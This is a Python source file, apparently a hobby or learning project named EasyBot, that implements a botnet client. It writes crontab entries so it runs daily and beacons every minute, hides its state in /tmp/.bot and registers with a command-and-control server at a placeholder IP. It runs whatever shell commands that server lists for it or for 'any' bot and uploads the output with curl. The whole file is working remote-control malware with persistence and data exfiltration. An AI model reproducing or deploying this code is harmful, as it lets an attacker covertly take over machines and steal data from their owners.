#!/usr/bin/env python3

import sys
import os
import requests
from datetime import datetime
import time

# Cronjob functions that set up bot to run 
# automatically each day and periodically beacon for instructions.
#whoami variable ensures that the program will always know where it is  
def cronjobs():
	whoami = os.getcwd()+"/EasyBot.py"
	start = '(crontab -l 2>/dev/null; echo "0 12 * * * '+whoami+' >/dev/null 2>&1") | crontab -'
	instructions = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' instructions >/dev/null 2>&1")| crontab -'
	croncheck = 'crontab -l > .cron.bot'
	startcron = '0 12 * * * '+whoami+' >/dev/null 2>&1'
	instructionscron = '* * * * * '+whoami+' instructions >/dev/null 2>&1'
	os.system(croncheck)
	with open('.cron.bot', 'r') as f:
		cronstring = f.read().strip('\n')
		if startcron not in cronstring:
			os.system(start)
		if instructionscron not in cronstring:
			os.system(instructions)
	os.system('rm .cron.bot')

#this creates hidden directory '.bot' in the working directory of the program.  
## in .bot, it creates a file called name.txt
def directoryhandler():
	dir = os.path.join('/tmp','.bot')
	if not os.path.exists(dir):
		os.mkdir(dir)
		os.chdir(dir)
		f = open('name.txt', 'w+')
		f.write('')
		f.close()

#namecheck reads the roster of bots and checks to see if it is listed.  
#if it is not listed, it names itself and sends its name to the server
def namecheck():
	dir = os.path.join('/tmp','.bot')
	os.chdir(dir)
	botnames = requests.get('http://{IP}:8080/botnames.txt')
	data = botnames.text.strip().split()
	lastbot = data[-1]
	with open('name.txt', 'r+') as f:
		if f.read() =='':
			myname = str(int(lastbot)+1)
			f.write(myname)
			request = 'curl -d '+myname+' http://{IP}:8080/botnames.txt'
			os.system(request)

#this checks the instructions page on the server 
#and does the commands labeled with its name that it sees
def instructions():
	dir = '/tmp/.bot/'
	os.chdir(dir)
	x = datetime.now()
	current_time = x.strftime("%H:%M:%S")
	current_date = x.strftime("%m/%d/%Y")
	myname = open('name.txt', 'r').read()
	header = "echo 'From Bot #"+myname+" on "+current_date+" at "+current_time+" ' >> sendthis.txt"
	os.system('curl http://{IP}:8080/instructions.txt > response.txt')
	os.system(header)
	with open('response.txt') as input_file:
		send = 0
		linebreak = '='*70
		end = '*' * 70
		for line in input_file:
			commands = line.split()
			mycommand = ''
			if commands[0] == myname or commands [0] == 'any':
				send = 1
				for thing in commands[1:]:
					mycommand += thing
					mycommand += ' '
				servecommand = mycommand.split('>>')[0]
				taskwrap = "echo '"+linebreak+"\nFrom Task: "+servecommand+"\n' >>sendthis.txt"
				os.system(taskwrap)
				os.system(mycommand)
		if send == 1:
			lasttask = "echo '"+end+"\nEnd of Tasks\n'"+end+" >>sendthis.txt"
			os.system(lasttask)
			os.system('curl --data-binary @./sendthis.txt http://{IP}:8080/instructions.txt')
		elif send == 0:
			online = "echo '"+end+"\nStatus is Online\n"+end+"' >> sendthis.txt"
			os.system(online)
			os.system('curl --data-binary @./sendthis.txt http://{IP}:8080/logs.txt')
	os.system('rm sendthis.txt response.txt')




if __name__ == '__main__':
	if len(sys.argv) == 1:
		cronjobs()
		directoryhandler()
		namecheck()
	elif sys.argv[1] == 'instructions':
		instructions()
